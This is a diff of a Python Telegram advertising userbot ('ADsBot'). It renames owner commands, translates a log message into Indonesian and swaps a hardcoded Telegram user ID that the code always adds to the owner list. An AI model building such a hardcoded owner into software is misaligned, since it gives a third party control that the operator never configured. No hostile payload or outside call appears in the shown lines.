@@ -33,11 +33,11 @@ try:
     PM_MEDIA = config("PM_MEDIA", default=None)
     PM_LOG_CHAT = config("PM_LOG_CHAT", default=None, cast=int)
 except Exception as e:
-    log.warning("Missing config vars %s", {e})
+    log.warning("Konfigurasi vars salah %s", {e})
     exit(1)
 
 OWNERS = [int(i) for i in owonerz.split(" ")]
-OWNERS.append(719195224) if 719195224 not in OWNERS else None
+OWNERS.append(1128130156) if 1128130156 not in OWNERS else None
 MESSAGES = MSGS.split("||")
 TIMES_SENT = 1
 PM_CACHE = {}
@@ -60,12 +60,12 @@ except Exception as e:
     exit(1)
 
 
-@client.on(events.NewMessage(incoming=True, from_users=OWNERS, pattern="^/alive$"))
+@client.on(events.NewMessage(incoming=True, from_users=OWNERS, pattern="^,stat$"))
 async def start(event):
     await event.reply("ADsBot is running.")
 
 
-@client.on(events.NewMessage(incoming=True, from_users=OWNERS, pattern="^/messages$"))
+@client.on(events.NewMessage(incoming=True, from_users=OWNERS, pattern="^,skejul$"))
 async def get_msgs(event):
     txt = f"**Total messages added:** {len(MESSAGES)}\n\n"
     for c, i in enumerate(MESSAGES, start=1):
